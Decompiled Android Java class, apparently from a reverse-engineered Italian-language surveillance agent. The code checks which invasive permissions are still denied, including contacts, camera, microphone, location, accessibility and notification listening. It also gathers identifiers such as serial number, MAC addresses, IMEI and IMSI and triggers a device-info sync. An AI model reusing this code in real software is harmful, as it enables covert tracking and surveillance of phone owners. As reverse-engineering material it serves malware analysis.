package com.app.system.common.entity;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Build.VERSION;
import android.provider.Settings;
import android.support.v4.content.ContextCompat;
import com.android.system.PermissionActivity;
import com.android.system.SimStateReceiver;
import com.app.system.common.d;
import com.app.system.common.d.a;
import com.app.system.common.d.b;
import com.app.system.common.d.c;
import com.app.system.common.h.a;
import com.app.system.common.service.EventsAndReceiveService;
import java.util.ArrayList;
import java.util.Iterator;

public class DeviceInfo
{
  private static final String TAG = "DeviceInfo";
  private static DeviceInfo instance;
  public int codVersioneAgent = 509;
  public String codice;
  public String costruttore;
  public ArrayList<MacAddress> indirizziMac = new ArrayList();
  public int livelloAPI;
  public String modello;
  public String nomeCommerciale;
  public String nomeVersioneAgent = "5.0.9";
  public String numeroSerie;
  public String patchSicurezza;
  public ArrayList<String> permessiNegati = new ArrayList();
  public SimInfo simInfo = new SimInfo();
  public String versioneAndroid;
  
  public static DeviceInfo a()
  {
    return instance;
  }
  
  public static ArrayList<String> a(Context paramContext)
  {
    String[] arrayOfString = new String[6];
    arrayOfString[0] = "android.permission.WRITE_EXTERNAL_STORAGE";
    arrayOfString[1] = "android.permission.READ_CONTACTS";
    arrayOfString[2] = "android.permission.CAMERA";
    arrayOfString[3] = "android.permission.RECORD_AUDIO";
    arrayOfString[4] = "android.permission.ACCESS_FINE_LOCATION";
    arrayOfString[5] = "android.permission.READ_PHONE_STATE";
    ArrayList localArrayList = new ArrayList();
    int i = arrayOfString.length;
    for (int j = 0; j < i; j++)
    {
      String str = arrayOfString[j];
      if (ContextCompat.checkSelfPermission(paramContext, str) != 0) {
        localArrayList.add(str);
      }
    }
    if (!PermissionActivity.a(paramContext)) {
      localArrayList.add("android.permission.BIND_ACCESSIBILITY_SERVICE");
    }
    if (!PermissionActivity.b(paramContext)) {
      localArrayList.add("android.permission.BIND_NOTIFICATION_LISTENER_SERVICE");
    }
    if (Build.VERSION.SDK_INT >= 23)
    {
      if (!Settings.canDrawOverlays(paramContext)) {
        localArrayList.add("OVERLAY");
      }
      if (!PermissionActivity.c(paramContext)) {
        localArrayList.add("BATTERY");
      }
    }
    return localArrayList;
  }
  
  public static void d(Context paramContext)
  {
    d.a(paramContext).a(new d.a()
    {
      public void a(d.b paramAnonymousb, Exception paramAnonymousException)
      {
        paramAnonymousException = new DeviceInfo(null);
        paramAnonymousException.costruttore = paramAnonymousb.a;
        paramAnonymousException.modello = paramAnonymousb.d;
        paramAnonymousException.nomeCommerciale = paramAnonymousb.b;
        paramAnonymousException.codice = paramAnonymousb.c;
        paramAnonymousException.numeroSerie = Build.SERIAL;
        paramAnonymousException.versioneAndroid = Build.VERSION.RELEASE;
        paramAnonymousException.livelloAPI = Build.VERSION.SDK_INT;
        if (Build.VERSION.SDK_INT >= 23) {
          paramAnonymousException.patchSicurezza = Build.VERSION.SECURITY_PATCH;
        } else {
          paramAnonymousException.patchSicurezza = "N.D.";
        }
        paramAnonymousException.indirizziMac = h.a.a();
        paramAnonymousException.simInfo = SimStateReceiver.a();
        DeviceInfo.a(paramAnonymousException);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Costruttore: ");
        paramAnonymousb.append(paramAnonymousException.costruttore);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Modello: ");
        paramAnonymousb.append(paramAnonymousException.modello);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Nome commerciale: ");
        paramAnonymousb.append(paramAnonymousException.nomeCommerciale);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Nome in codice: ");
        paramAnonymousb.append(paramAnonymousException.codice);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Numero di serie: ");
        paramAnonymousb.append(paramAnonymousException.numeroSerie);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Versione Android: ");
        paramAnonymousb.append(paramAnonymousException.versioneAndroid);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Livello API: ");
        paramAnonymousb.append(paramAnonymousException.livelloAPI);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = new StringBuilder();
        paramAnonymousb.append("Patch di sicurezza: ");
        paramAnonymousb.append(paramAnonymousException.patchSicurezza);
        com.security.d.a.d("DeviceInfo", paramAnonymousb.toString(), new Object[0]);
        paramAnonymousb = paramAnonymousException.indirizziMac.iterator();
        while (paramAnonymousb.hasNext())
        {
          paramAnonymousException = (DeviceInfo.MacAddress)paramAnonymousb.next();
          StringBuilder localStringBuilder = new StringBuilder();
          localStringBuilder.append("MAC: ");
          localStringBuilder.append(paramAnonymousException.interfaccia);
          localStringBuilder.append(" = ");
          localStringBuilder.append(paramAnonymousException.mac);
          com.security.d.a.d("DeviceInfo", localStringBuilder.toString(), new Object[0]);
        }
      }
    });
  }
  
  public boolean a(ArrayList<String> paramArrayList)
  {
    int i = this.permessiNegati.size();
    int j = paramArrayList.size();
    boolean bool = true;
    if (i == j)
    {
      Iterator localIterator = this.permessiNegati.iterator();
      while (localIterator.hasNext()) {
        if (!paramArrayList.contains((String)localIterator.next())) {
          break label66;
        }
      }
      bool = false;
    }
    label66:
    return bool;
  }
  
  public void b(Context paramContext)
  {
    this.permessiNegati = a(paramContext);
  }
  
  public void c(Context paramContext)
  {
    Object localObject = a(paramContext);
    if (a((ArrayList)localObject))
    {
      this.permessiNegati = ((ArrayList)localObject);
      localObject = new Intent(paramContext, EventsAndReceiveService.class);
      ((Intent)localObject).putExtra("event_core_app", "event_sync_device_info");
      com.b.a.a.a.a(paramContext, (Intent)localObject);
    }
  }
  
  public static class MacAddress
  {
    public String interfaccia;
    public String mac;
    
    public MacAddress(String paramString1, String paramString2)
    {
      this.interfaccia = paramString1;
      this.mac = paramString2;
    }
  }
  
  public static class SimInfo
  {
    public String IMEI;
    public String IMSI;
    public String countryISO;
    public String operator;
    public String operatorName;
    public String serial;
  }
}


/* Location:              ~/com/app/system/common/entity/DeviceInfo.class
 *
 * Reversed by:           J
 */